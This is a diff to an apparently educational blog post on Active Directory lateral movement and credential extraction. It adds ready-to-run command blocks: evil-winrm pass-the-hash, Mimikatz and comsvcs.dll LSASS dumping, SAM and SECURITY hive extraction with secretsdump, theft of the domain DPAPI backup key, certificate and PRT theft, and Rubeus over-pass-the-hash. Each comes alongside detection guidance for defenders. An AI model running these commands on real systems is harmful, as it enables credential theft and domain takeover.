@@ -53,6 +53,17 @@ The detail that trips up nearly everyone the first time they rely on it operatio
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The same three fixes, CredSSP, classic constrained delegation, or RBCD, that make legitimate multi-tier administration work are exactly what an attacker needs configured to pivot past the second hop too.</p>
 </div>
 
+**Requirements:** membership in the target's local Administrators group (WinRM's default authorization check), or an explicit WinRM access ACE if that default has been loosened.
+
+```bash
+# from a domain-joined Windows host
+Enter-PSSession -ComputerName server-a.corp.local -Credential $cred
+Invoke-Command -ComputerName server-a.corp.local -ScriptBlock { whoami } -Credential $cred
+
+# from Linux, evil-winrm is the equivalent for a captured hash or password
+evil-winrm -i server-a.corp.local -u $USER -H $NTHASH
+```
+
 **Detection.** A PowerShell Remoting session spawns `wsmprovhost.exe` on the target, a reliable parent-process signal in EDR or Sysmon telemetry, especially with unusual child processes underneath it. With Script Block Logging and Module Logging enabled via Group Policy, **event 4104** captures the full text of every script executed in the session (even deobfuscated at runtime) and **event 4103** logs pipeline and module details, together the two highest-value PowerShell-specific log sources in any Windows environment. On the target, the session itself produces an ordinary **event 4624** logon.
 
 ## Credential Extraction: Where Windows Actually Keeps Secrets
@@ -81,7 +92,20 @@ Once an attacker is on a box, the question becomes what's actually extractable f
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>WDigest is disabled by default since Windows 8.1 and Server 2012 R2, but still turns up toggled on in older or migrated environments.</p>
 </div>
 
-Mimikatz's `sekurlsa::logonpasswords` reads all of this on an unprotected host. On a host with <Term concept="credential-guard">Credential Guard</Term> enabled, that same command returns "KO - LSA Isolated": the secrets simply aren't in a memory space Mimikatz's technique can reach anymore. **Detection:** any process opening a handle to `lsass.exe` with memory-read access is inherently worth alerting on. **Event 4656** (a handle requested to an object) with `lsass.exe` as the target, or Sysmon **event 10** (ProcessAccess) with `lsass.exe` as the target process, are the two primary native signals, and this is one of the very few places where a well-tuned allowlist (a small, known set of legitimate processes ever touch LSASS this way) makes a high-fidelity detection genuinely achievable.
+Mimikatz's `sekurlsa::logonpasswords` reads all of this on an unprotected host. On a host with <Term concept="credential-guard">Credential Guard</Term> enabled, that same command returns "KO - LSA Isolated": the secrets simply aren't in a memory space Mimikatz's technique can reach anymore.
+
+**Requirements:** local Administrator (`SeDebugPrivilege`) on the target host, and no Credential Guard for the live in-memory read; offline dumping bypasses live EDR hooks on the LSASS read itself but still needs the same local admin access to create the dump.
+
+```bash
+# live, on an unprotected host
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# offline: dump LSASS via a signed LOLBin, then parse away from the monitored host
+rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full
+pypykatz lsa minidump lsass.dmp
+```
+
+**Detection:** any process opening a handle to `lsass.exe` with memory-read access is inherently worth alerting on. **Event 4656** (a handle requested to an object) with `lsass.exe` as the target, or Sysmon **event 10** (ProcessAccess) with `lsass.exe` as the target process, are the two primary native signals, and this is one of the very few places where a well-tuned allowlist (a small, known set of legitimate processes ever touch LSASS this way) makes a high-fidelity detection genuinely achievable.
 
 ### SAM and LSA Secrets: The SECURITY and SAM Hives
 
@@ -116,6 +140,19 @@ The <Term concept="sam-database">SAM database</Term> holds every local account's
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Live equivalents: Mimikatz's lsadump::sam and lsadump::secrets, or a simple `reg save` of all three hives followed by offline parsing.</p>
 </div>
 
+**Requirements:** SYSTEM privilege or `SeBackupPrivilege` on the host, local or remote (remote extraction only needs remote registry access plus that privilege).
+
+```bash
+# live extraction, on-host
+reg.exe save hklm\sam sam.hive
+reg.exe save hklm\security security.hive
+reg.exe save hklm\system system.hive
+
+# offline parsing, from the saved hives or over the wire against a live host
+secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
+secretsdump.py $DOMAIN/$USER:$PASSWORD@$TARGET_HOST
+```
+
 **Detection:** reading these hives requires SYSTEM privilege or `SeBackupPrivilege`, and the classic live-extraction pattern, `reg.exe save hklm\sam`, `reg.exe save hklm\security`, `reg.exe save hklm\system` in quick succession, is specific enough to be a reliable process-creation detection on its own, alongside **event 4657** for the underlying registry value access if auditing is configured.
 
 ### DPAPI: Credential Manager, Vault, and the Domain Backup Key
@@ -123,6 +160,17 @@ The <Term concept="sam-database">SAM database</Term> holds every local account's
 <Term concept="dpapi">DPAPI</Term> is what actually protects Windows Credential Manager entries (anything saved via `cmdkey` or the Credentials applet), the Windows Vault, and some browser-saved passwords. Every DPAPI-protected secret is encrypted under a per-user master key, and that master key is where the interesting part lives: it's protected two different ways at once. One copy is derived from the user's own password (or NTLM hash), which is why an attacker who already has that can decrypt locally. The other copy is encrypted under a domain-wide public key and backed up automatically the first time the master key is created, specifically so a forgotten password doesn't mean permanently losing access to Credential Manager entries.
 
 The domain controllers hold the private half of that backup key pair, and it never changes on its own. An attacker with Domain Admin rights extracts it once, with Mimikatz's `lsadump::backupkeys` or the equivalent in <Term concept="sharpdpapi">SharpDPAPI</Term>, and from that point on can decrypt any domain user's DPAPI-protected secrets, forever, without ever knowing that user's password.
+
+**Requirements:** for the local-decrypt path, the target user's password or NTLM hash; for the domain-wide path, Domain Admin (or equivalent) once, to pull the backup key, after which no further privilege is needed against any individual user.
+
+```bash
+# extract the domain-wide DPAPI backup key once
+mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:$DC_IP /export" "exit"
+
+# decrypt any domain user's Credential Manager / Vault blobs with it, going forward
+SharpDPAPI.exe credentials /pvk:key.pvk
+SharpDPAPI.exe vaults /pvk:key.pvk
+```
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 260" style={{ width: "100%", maxWidth: "580px" }} role="img" aria-label="A diagram showing a user's DPAPI protected secret, such as a Credential Manager entry, encrypted under a master key. That master key is itself protected two ways: derived from the user's password for local decryption, and separately backed up under a domain-wide public key whose private half is held by the domain controllers. An attacker with Domain Admin rights extracts that private backup key once and can then decrypt any domain user's DPAPI secrets indefinitely, without ever knowing their password.">
@@ -159,9 +207,25 @@ The domain controllers hold the private half of that backup key pair, and it nev
 
 A private key marked non-exportable in the Windows certificate store is a policy setting enforced by CryptoAPI (CAPI) or CNG (the newer Cryptography API), not a cryptographic guarantee. Mimikatz's `crypto::capi` and `crypto::cng` commands patch the relevant provider in memory to strip that flag, after which the certificate exports normally. This matters directly for Part 3's AD CS content: a stolen certificate with the Client Authentication EKU authenticates via PKINIT exactly like a freshly requested one, so a certificate an attacker finds sitting on a compromised host can be just as useful as one obtained through ESC1.
 
+**Requirements:** local Administrator on the host holding the certificate; the non-exportable flag is a user-mode policy check, so admin-level code execution is enough to patch around it.
+
+```bash
+mimikatz.exe "privilege::debug" "crypto::capi" "crypto::cng" "crypto::certificates /export" "exit"
+```
+
 ### Azure and Entra Tokens
 
 On a hybrid-joined or Entra-joined machine, the highest-value credential often isn't an AD artifact at all. A <Term concept="primary-refresh-token">Primary Refresh Token</Term> bundles proof of user sign-in with proof of device compliance, and because Conditional Access policies frequently key off device compliance, a stolen PRT doesn't just impersonate the user, it bypasses the Conditional Access policies and MFA requirements that would otherwise stop a plain stolen password cold. Tools like `ROADtoken` and `TokenTactics`, along with newer `cloudap::` functionality in Mimikatz itself, extract the PRT and MSAL token caches that browsers, Office applications, and the Azure CLI all maintain locally, turning one compromised endpoint into standing access across every cloud application tied to that identity.
+
+**Requirements:** local Administrator (or SYSTEM) on the hybrid-joined or Entra-joined endpoint; the PRT is protected by the same TPM-backed session key the device uses, so extraction happens in-process rather than by reading a file off disk.
+
+```bash
+# extract the PRT via the Cloud AP provider, in-process
+mimikatz.exe "privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<...> /unprotect" "exit"
+
+# forge a new PRT cookie for browser-based session reuse
+python3 TokenTactics/PRT-Cookie-Generator.py -p $PRT -s $SESSION_KEY
+```
 
 ### Mimikatz: The Tool That Ties It Together
 
@@ -201,7 +265,17 @@ Classic <Term concept="pass-the-hash">Pass the Hash</Term> reuses a captured NTL
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Either branch yields the same thing: a real TGT, from a real KDC, that outlives the stolen hash it was built from and works everywhere Kerberos does, including against resources NTLM alone couldn't reach.</p>
 </div>
 
-Current tooling: Rubeus's `asktgt` module, with `/rc4:<hash>` for Over-Pass-the-Hash or `/aes256:<key>` for Pass the Key, requests the TGT and injects it directly into the current logon session. The resulting ticket is then reusable exactly like a stolen one, <Term concept="pass-the-ticket">Pass the Ticket</Term> from that point forward.
+**Requirements:** an NTLM hash or AES key for the target account, obtained from any of the credential-extraction techniques above, no plaintext password required.
+
+```bash
+# Over-Pass-the-Hash: RC4, produces an encryption-type downgrade
+Rubeus.exe asktgt /user:$TARGET_USER /rc4:$NTHASH /domain:$DOMAIN /ptt
+
+# Pass the Key: AES, no downgrade, blends into an AES-default environment
+Rubeus.exe asktgt /user:$TARGET_USER /aes256:$AESKEY /domain:$DOMAIN /ptt
+```
+
+Both requests inject the resulting TGT directly into the current logon session. The ticket is then reusable exactly like a stolen one, <Term concept="pass-the-ticket">Pass the Ticket</Term> from that point forward.
 
 **Detection:** an **event 4768** (TGT requested) with encryption type `0x17` (RC4) for an account in an environment that otherwise only ever uses AES is close to unambiguous, the same encryption-downgrade signal that flags Kerberoasting and AS-REP Roasting in Part 3. Pass the Key produces no such downgrade and is correspondingly harder to catch from the encryption type alone; the more durable signal there is the same identity authenticating from two hosts in a pattern inconsistent with normal usage.
 
@@ -280,3 +354,5 @@ Nothing in this post is a single dramatic exploit. It's a loop: land, extract wh
 	The tool behind the asktgt /rc4 and /aes256 commands referenced in the Over-Pass-the-Hash section.
 11. "Active Directory Series: Part 3 - From Enumeration to Privilege Escalation" (this blog). [/posts/active-directory-security-part3](/posts/active-directory-security-part3)
 	The full DCSync and Golden Ticket walkthrough this post's endgame section links out to rather than repeating.
+12. The Hacker Recipes, "Active Directory: Movement." [https://www.thehacker.recipes/ad/movement/](https://www.thehacker.recipes/ad/movement/)
+	A command-level reference for lateral movement and credential extraction, used as a structural model for the requirements lines and command blocks added throughout this post.
